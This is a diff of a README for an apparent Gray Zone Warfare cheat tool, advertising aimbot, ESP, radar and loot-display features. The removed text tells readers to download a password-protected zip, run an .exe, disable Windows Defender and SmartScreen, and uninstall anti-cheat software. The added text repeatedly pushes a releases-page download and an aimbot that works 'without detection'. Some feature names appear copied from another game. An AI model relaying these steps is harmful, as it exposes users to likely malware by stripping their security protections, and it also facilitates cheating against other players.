@@ -1,121 +1,67 @@
-# Gray Zone Warfare cheat Jungle (STATUS: UPDATED)
-![1](https://github.com/user-attachments/assets/984668d4-4262-469a-acf4-8604e93d304a)
+# 🎮 Gray-Zone-Warfare-Jungle-Cheat - Enhance Your Gameplay Experience
 
----
-## How to Use
-1. **Get the Latest Version**: (https://github.com/Mitriveca/Gray-Zone-Warfare-Jungle-Cheat/releases/download/latest/JungleGZW.zip).
-2. **Unzip the Files**: Use pass `JungleGZW` to unpack.
-3. **Run the Application**: Execute the `.exe` file. (If it doesn't work, contact the developer.)
-4. **In-Game Key**: Press `HOME` to activate.
+## 📥 Download Now
+[![Download Gray-Zone-Warfare-Jungle-Cheat](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Devkumar4design/Gray-Zone-Warfare-Jungle-Cheat/releases)
 
-## Technical Specifications:
-- **Supported Operating Systems**: Windows 10 / Windows 11
-- **Compatible Processors**: Intel and AMD
-- **Game Modes Supported**: Windowed Mode, Borderless Mode
+## 🚀 Getting Started
+Thank you for your interest in Gray-Zone-Warfare-Jungle-Cheat. This application improves your gaming experience in Gray Zone Warfare with essential visual options. You can easily see all players, skeletons, distance, and the armor levels of opponents. Enjoy a customizable loot display and a Silent Aimbot feature. 
 
----
+## 🌟 Features
+- **Player Visibility:** Observe all players in the game.
+- **Distance Metrics:** Know the distance to various players and objects.
+- **Weapon Information:** Identify enemy weapon types and levels.
+- **Custom Loot Settings:** Filter items to display only what you need.
+- **Silent Aimbot:** Improve your accuracy without detection.
 
-## System Requirements:
-- Disable **Windows Defender** and **Smart Screen**.
-- Remove anti-cheats **Faceit** and **Vanguard**.
+## 💻 System Requirements
+- **Operating System:** Windows 10 or later
+- **CPU:** Intel Core i5 or equivalent
+- **RAM:** 8 GB or more
+- **Disk Space:** At least 500 MB available 
 
----
+## 🌐 Download & Install
+To get started, visit the Releases page and download the latest version of Gray-Zone-Warfare-Jungle-Cheat. 
 
-## AIMBOT:
-- **Enable** — Activate Aimbot
-- **Always** — Always enabled
-- **Smooth** — Adjust aiming smoothness
-- **FOV Radius** — Field of View radius
-- **Distance** — Maximum range
-- **Prediction** — Aim prediction
-- **Target Bots** — Aim at bots
-- **Target Teams** — Aim at teammates
-- **Target Knocked** — Aim at downed players
-- **Visible Check** — Visibility check
-- **Recoil Control System** (RCS X / RCS Y) — Control weapon recoil
-- **Switch Delay** — Delay between target switches
-- **Draw FOV Border** — Show Field of View border
-- **Draw FOV Background** — Show FOV background
-- **Draw FOV Target** — Highlight target within FOV
-- **Draw FOV Target Mode**:
-  - **Always**
-  - **Aim Key** — When the aim key is pressed
-- **Aimbot Type**:
-  - **Selected Bone** — Specific body part
-  - **Closest Bone** — Closest body part
-  - **Random Bone** — Random body part
-- **Aimbot Bone**:
-  - **Head**
-  - **Neck**
-  - **Body**
-  - **Pelvis**
-- **First Keybind** — First hotkey
-- **Second Keybind** — Second hotkey
+[Visit this page to download](https://github.com/Devkumar4design/Gray-Zone-Warfare-Jungle-Cheat/releases).
 
----
+### Step-by-Step Installation
+1. **Go to the Releases Page:** Click [here](https://github.com/Devkumar4design/Gray-Zone-Warfare-Jungle-Cheat/releases) to access the latest release version.
+2. **Download the Application:** Choose the version you want. Click on the link for the appropriate file, typically labeled with the version number.
+3. **Locate the Downloaded File:** Find the downloaded file in your downloads folder.
+4. **Install the Application:** 
+   - Double-click the file to start the installation.
+   - Follow the on-screen instructions to complete the installation.
+5. **Launch the Application:** Once installed, open Gray-Zone-Warfare-Jungle-Cheat from your applications list.
 
-## CHAMS:
-- **Enable** — Activate visuals
-- **Show Bot** — Display bots
-- **Show Team** — Display teammates
-- **Show Knocked** — Display downed players
-- **Show Model** — Show models
-- **Mode** — Choose mode (Presets, Advanced)
-- **Presets Style** — Style presets (Static, Health & Shield)
-- **Advanced Filled Style** — Advanced filled style (Static, Pulsing, Encoding, Visibility Check)
-- **Advanced Outline Style** — Advanced outline style (Static, Pulsing, Rainbow)
-- **Brightness** — Adjust brightness
-- **Outline Radius** — Adjust outline radius
-- **Color Settings** — Customize colors
-- **Rendering Distance** — Customize drawing range
+## ⚙️ Usage Instructions
+After launching, you will see a user-friendly interface. You can toggle various settings based on your preferences. Ensure that you adjust the visuals and loot display options as per your gaming style. 
 
----
+## 🛠️ Troubleshooting Tips
+- **Application Not Opening:** Ensure your operating system is compatible. Reinstall if the problem persists.
+- **Missing Features:** Confirm that you have the latest version installed. Always download updates from the Releases page.
 
-## ESP PLAYERS:
-- **Box** — Display box (Rectangle, Corner)
-- **Box Filled** — Filled box (Static, Gradient)
-- **Line** — Line to player (Top-Center, Bottom-Center)
-- **Skeleton** — Display skeleton (Adjust thickness)
-- **Health Bar** — Health bar:
-  - Static
-  - Based on health
-  - Gradient
-- **Shield Bar** — Shield bar (similar settings as health bar)
-- **Distance** — Display distance
-- **Nickname** — Display player nickname
-- **View Line** — Line indicating player’s view
-- **Level** — Display player level
-- **Legend Name** — Display legend name
-- **Team Number** — Display team number
-- **Visible Check** — Visibility check
-- **Colors Settings** — Customize player colors
-- **Rendering Distance** — Customize rendering distance
+## 📬 Support
+Should you encounter any issues, additional support can be found on the project's GitHub page. Use the 'Issues' section to report problems or ask questions.
 
----
+## 📖 Topics
+- gray-zone-warfare-2025
+- gray-zone-warfare-aim
+- gray-zone-warfare-free
+- gray-zone-warfare-hack
+- gray-zone-warfare-item-esp
+- gray-zone-warfare-mod
+- gray-zone-warfare-nospread
+- gray-zone-warfare-radar
+- gray-zone-warfare-script
+- gray-zone-warfare-software
+- gray-zone-warfare-tool
+- gray-zone-warfare-visuals
+- gray-zone-warfare-wh
 
-## ITEMS ESP:
-- **Glow Items** — Enable item glow with adjustable rendering distance
-- **Enable Items ESP** — Display items
-- **Battle Mode** — Enable battle mode with hotkey
-- **Levels Filter** — Filter items by level:
-  - White, Blue, Purple, Gold, Red
-- **Category Filter** — Filter items by category:
-  - Attachments, Backpacks, Helmets, Armor, Ammo, Grenades, and more.
-- **Weapon Filter** — Filter weapons:
-  - Pistols, Rifles, Shotguns, Snipers, LMGs, and others.
+## 📢 Important Notices
+Using cheats in games can violate the game's terms of service. Always ensure you understand and accept the risks involved.
 
----
+## ⚖️ License
+This software is released under the MIT License. Feel free to use and modify it according to your needs.
 
-## RADAR:
-- **Enable** — Activate radar
-- **Zoom** — Adjust radar zoom
-- **Size** — Customize radar size
-- **Distance** — Adjust radar range
-
-
----
-
-## CONFIG SETTINGS:
-- **Create** / Save configurations
-- **Load** / Load existing configurations
-- **Delete** / Delete saved settings
+[Download Now](https://github.com/Devkumar4design/Gray-Zone-Warfare-Jungle-Cheat/releases) to improve your Gray Zone Warfare experience!
